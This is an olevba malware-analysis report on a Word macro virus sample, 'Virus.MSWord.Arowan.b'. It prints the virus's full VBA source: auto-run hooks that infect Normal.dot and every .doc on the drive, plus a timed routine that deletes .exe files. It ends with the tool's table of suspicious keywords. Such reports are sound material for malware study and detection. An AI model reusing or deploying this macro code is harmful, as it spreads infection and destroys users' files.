olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Arowan.b-f7c1d148c52866ddc0e82eb0a3faa308160b1c56
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Arowan.b-f7c1d148c52866ddc0e82eb0a3faa308160b1c56 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module3.bas 
in file: Virus.MSWord.Arowan.b-f7c1d148c52866ddc0e82eb0a3faa308160b1c56 - OLE stream: 'Macros/VBA/Module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro suriv "EXE Cuttor"

Sub autoopen()

Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists("C:\windows\system\SARC.dll") = False Then

On Error Resume Next

With ActiveDocument.AttachedTemplate
            Application.OrganizerDelete _
                Source:="C:\Windows\Application Data\Microsoft\Modèles\Normal.dot", _
                Name:="Module3", _
                Object:=wdOrganizerObjectProjectItems
End With

On Error Resume Next

ActiveDocument.SaveAs ("c:\windows\system\EXE Cuttor.Doc")

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:="c:\windows\Application data\microsoft\modèles\normal.dot", _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems

Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("c:\Windows\System\SARC.dll", True)
a.Close

On Error Resume Next

Else

On Error Resume Next

Set fsb = CreateObject("Scripting.FileSystemObject")
If fsb.FileExists("C:\Windows\system\EXE Cuttor.doc") = False Then
MsgBox "Vous avez essaiez de schque ?!?!", vbExclamation + vbOKOnly, "Ou est passé EXE Cuttor.doc ???"
MsgBox " >:-> ", vbExclamation + vbOKOnly, " :o) "
Application.OnTime When:=Now + TimeValue("00:00:15"), _
Name:="Project.Module3.kill"
End If

Application.OrganizerCopy Source:="C:\Windows\system\EXE Cuttor.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems
End If

End Sub
Sub search()
Dim fs As String
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.doc"
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
End With

On Error Resume Next

With Application.FileSearch
    If .Execute() > 0 Then
        For I = 1 To .FoundFiles.Count
            I.Attributes = I.Attributes - 1
            Application.OrganizerCopy Source:="c:\windows\system\EXE Cuttor.doc", _
            Destination:=.FoundFiles(I), _
            Name:="Module3", _
            Object:=wdOrganizerObjectProjectItems
            I.Attributes = I.Attributes + 0
            I.Attributes = I.Attributes + 1
           Next I
    Else
         End If
End With
Application.OnTime When:=Now + TimeValue("01:01:01"), _
Name:="Project.Module3.Destroye"
End Sub
Sub AutoNew()

On Error Resume Next

Application.OrganizerCopy Source:="C:\Windows\system\EXE Cuttor.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems

On Error Resume Next

ActiveDocument.Save

End Sub
Sub Destroye()
Dim po
    Set po = CreateObject("Scripting.FileSystemObject")
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.exe"
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
End With

On Error Resume Next

With Application.FileSearch
    If .Execute() > 0 Then
        For e = 0 To 2
        po.deletefile .FoundFiles(e), True
         Next e
    Else
         End If
End With
End Sub
Sub kill()
MsgBox "Ma vengence va étre terrible !!!", vbCritical + vbOKOnly

ActiveDocument.SaveAs ("c:\windows\system\EXE Cuttor.Doc")

Call search
End Sub

'Macro suriv "EXE Cuttor"

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |SARC.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

